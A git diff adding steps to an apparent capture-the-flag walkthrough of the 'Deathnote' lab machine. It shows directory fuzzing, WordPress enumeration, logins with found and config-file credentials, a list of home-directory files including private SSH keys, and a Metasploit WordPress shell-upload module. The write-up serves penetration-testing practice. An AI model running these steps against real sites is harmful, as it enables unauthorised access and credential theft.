@@ -98,6 +98,10 @@ nikto -h http://deathnote.vuln
 
 ```
 
+
+
+
+
 ## Bruteforcing directories
 ```
 ffuf -c -r -w /usr/share/dirb/wordlists/common.txt -u http://deathnote.vuln/FUZZ
@@ -135,7 +139,19 @@ wordpress               [Status: 200, Size: 17961, Words: 583, Lines: 144, Durat
 
 ```
 
+
+
+
 ## Hints
+### Robots.txt
+```
+fuck it my dad 
+added hint on /important.jpg
+
+ryuk please delete it
+```
+
+### Important.jpg
 ```
 i am Soichiro Yagami, light's father
 i have a doubt if L is true about the assumption that light is kira
@@ -149,15 +165,167 @@ iamjustic3
 
 ```
 
+### Checking the contents of the page
+```
+http://deathnote.vuln/wordpress/
+http://deathnote.vuln/wordpress/index.php/hint/
+http://192.168.88.53/wordpress/wp-content/uploads/2021/
+```
+
+
+## Wordpress
+### Finding the version
+```
+findwordpressversions /tmp/y
+[+] Using input file /tmp/y
+==================================
+http://deathnote.vuln/wordpress/ = >  [+] WordPress 5.8
+
+```
+
+### Finding user.txt and notes.txt
+```
+http://192.168.88.53/wordpress/wp-content/uploads/
+http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
+```
+
+### USER.txt
+```
+KIRA
+L
+ryuk
+rem
+misa
+siochira 
+light
+takada
+near
+mello
+l
+kira
+RYUK
+REM
+SIOCHIRA
+LIGHT
+NEAR
+```
+
+### Notes.txt
+```
+death4
+death4life
+death4u
+death4ever
+death4all
+death420
+death45
+death4love
+death49
+death48
+death456
+death4014
+1death4u
+yaydeath44
+thedeath4u2
+thedeath4u
+stickdeath420
+reddeath44
+megadeath44
+megadeath4
+killdeath405
+hot2death4sho
+death4south
+death4now
+death4l0ve
+death4free
+death4elmo
+death4blood
+death499Eyes301
+death498
+death4859
+death47
+death4545
+death445
+death444
+death4387n
+death4332387
+death42521439
+death42
+death4138
+death411
+death405
+death4me
+```
+
+## Logging In
+```
+http://deathnote.vuln/wordpress/wp-login.php
+username : kira
+password : iamjustic3 ( found at http://deathnote.vuln/wordpress/)
+
+```
+
+## Reading config files 
+```
+
+/** MySQL database username */
+define( 'DB_USER', 'l' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'death4me' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+```
+
+
+### Loggin in 
+```
+username is l
+password is death4me
+```
+
+### Interesting files
+```
+/home/l/.bash_logout
+/home/l/.bash_history
+/home/l/.profile
+/home/l/user.txt
+/home/l/.bashrc
+/home/l/.ssh/id_rsa.pub
+/home/l/.ssh/id_rsa
+/home/l/.ssh/known_hosts
+/home/kira/.bash_logout
+/home/kira/.bash_history
+/home/kira/.profile
+/home/kira/kira.txt
+/home/kira/.bashrc
+/home/kira/.ssh/authorized_keys
+
+```
+
+
+### user.txt
+```
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
+```
+
 ## Fuzzing php files
 ```
-
+http://deathnote.vuln/wordpress/wp-admin/includes/admin.php
 ```
 
 
-## Payload
+## Payload - Metasploit
 ```
-
+exploit/unix/webapp/wp_admin_shell_upload
 ```
 
 ### Uploading a better shell
